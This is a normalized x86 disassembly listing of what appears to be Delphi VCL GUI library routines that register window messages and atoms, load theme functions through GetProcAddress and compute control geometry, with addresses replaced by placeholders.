call sub_3abc458
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_3abc458
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_3abcc84
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_3abc2dc
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_3a78df4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_3abcbf4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_3abc2dc
sub_3abccd4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
mov eax ebx
call sub_3abc214
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_3a78df4
lea edx [ ebp - 0xc ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_3abaf38
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x14
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov eax esi
xor edx edx
call sub_3aafaa8
jmp r-xdata
mov eax esi
call sub_3acb504
jmp r-xdata
sub_3abcd48
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_3abce29
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ebx eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_3a652a0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abce30
lea eax [ ebp - 0x24 ]
call sub_3a652a0
retn
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_3aaf4a0
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi ]
mov eax [ ebp - 0x20 ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov edx [ ebx + 0x48 ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_3aafb88
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
call sub_3a652f4
mov eax [ ebp - 0xc ]
mov edi eax
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub eax 0x12
jne r-xdata
sub_3abce3c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_3abd02c
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_3abcecc
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x2c ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_3abd00c
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x2c ]
call [ eax + 0x2c ]
mov [ ebx + 0x28 ] eax
sub_3abcef8
push ebx
push esi
call sub_3a6478c
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3abcfe4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3abcf4c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_3abcf8c
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_3abcfbc
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_3a67fa8
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_3abcfe4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3abcf28
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_3abd00c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x28 ] esi
lea eax [ ebx + 0x28 ]
call sub_3a6efbc
sub_3abd02c
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_3abcf70
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_3abcf8c
pop ebx
retn
mov eax ebx
call sub_3abcfbc
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call __imp_SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_3abd090
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3abd1f6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_3abd314
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_3abd2f8
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_3abd2f8
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
movzx edx bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_3abd400
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3a64380
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_3a64380
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_3a64380
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_3a64380
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_3a652a0
movzx eax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_3a652a0
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_3abd488
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3abd600
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_3a6a850
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_3a652f4
mov eax [ rw-data ]
call sub_3a65730
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_3a6a850
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_3a652f4
mov eax [ rw-data ]
call sub_3a65730
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_3a65730
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a7a740
mov [ rw-data ] eax
call sub_3abd090
mov dl 0x1
mov eax [ r-xdata ]
call sub_3abce3c
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3acc6ac
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_3acd92c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_3acfc94
mov ecx r-xdata
mov edx sub_3aac840
mov eax [ r-xdata ]
call sub_3a79c50
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abd607
lea eax [ ebp - 0x10 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_3abd670
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_3a64350
mov [ edi + 0x4 ] esi
mov eax [ edi ]
mov edx edi
call [ eax + 0x14 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3abd6b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_3a7abb4
pop esi
pop ebx
retn
mov eax ebx
mov edx [ esi + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ esi + 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ esi + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_3abd730
push esi
mov esi eax
sub edx 0x1
jb r-xdata
cmp ecx [ esi + 0x8 ]
je r-xdata
je r-xdata
pop esi
retn
mov [ esi + 0x8 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0xc ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0xc ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x10 ]
je r-xdata
dec edx
je r-xdata
mov [ esi + 0x10 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
retn
cmp ecx [ esi + 0x14 ]
je r-xdata
jmp r-xdata
mov [ esi + 0x14 ] ecx
mov eax esi
mov edx [ eax ]
call [ edx + 0xc ]
sub_3abd788
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor edx edx
push ebp
push sub_3abd863
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov [ ebx + 0x164 ] 0x1
or [ ebx + 0x54 ] 0x4000
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx edi
mov edx esi
mov ebx [ eax ]
call [ ebx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ ebx + 0x164 ] 0x0
and [ ebx + 0x54 ] 0xbfff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx eax
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x10 ]
mov ecx [ ebp + 0x10 ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xc ]
mov ecx [ ebp - 0x4 ]
add edx [ ecx + 0x14 ]
mov ecx [ ebp + 0xc ]
sub ecx edx
push ecx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
add ecx edi
mov edx eax
add edx esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x88 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_3abd874
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp edx 0x7
ja r-xdata
jmp [ edx * 4 + jump_table_3abd893 ]
mov eax [ ebx + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3ab28b0
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x40 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x44 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x180 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x184 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x188 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x18c ]
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x40 ]
sub eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x44 ]
sub eax [ ebx + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x8 ]
add eax [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x4c ]
add eax [ ebx + 0xc ]
add eax [ ebx + 0x14 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x180 ]
sub eax [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x184 ]
sub eax [ ebx + 0xc ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x188 ]
add eax [ ebx + 0x8 ]
add eax [ ebx + 0x10 ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x18c ]
add eax [ ebx + 0xc ]
add eax [ ebx + 0x14 ]
jmp r-xdata
sub_3abda3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_3abda9b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3abdaa2
retn
mov eax rw-data
call sub_3a6efbc
call sub_3abd400
mov eax rw-data
call sub_3a652a0
mov eax rw-data
call sub_3a652a0
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_3a65e38
sub_3abdccc
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
mov ecx 0x64
mov edx [ rw-data ]
mov eax ebx
call sub_3ab0e78
cmp eax 0x64
sete al
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
sub_3abdd44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_3a64350
call sub_3a91280
mov [ esi + 0x5 ] al
mov eax r-xdata
call sub_3a6dbd4
cmp eax 0x60000
setae al
mov [ esi + 0x4 ] al
mov eax esi
call sub_3abe5b4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax esi
pop esi
pop ebx
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3abddb5
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_3a6478c
mov ebx edx
mov esi eax
mov eax esi
call sub_3abde58
call sub_3a910c0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_3a64370
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_3a64734
sub_3abddec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
movzx eax bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
movzx eax bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_3abde58
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_3abde9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_3abdee8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
movzx edx [ ebp - 0xc ]
mov eax ebx
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3abdf2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
movzx edx [ ebx ]
mov eax esi
call sub_3abddec
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_3abdf94
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_3abdfd0
mov [ ecx ] 0xa
movzx eax dl
cmp eax 0x11
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_3abdfe9 ]
jmp [ eax * 4 + jump_table_3abdffb ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xa
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_3abe06c
mov [ ecx ] 0xe
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_3abe0bc
mov [ ecx ] 0x17
movzx eax dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
movzx eax [ eax + lookup_table_3abe0d9 ]
jmp [ eax * 4 + jump_table_3abe142 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
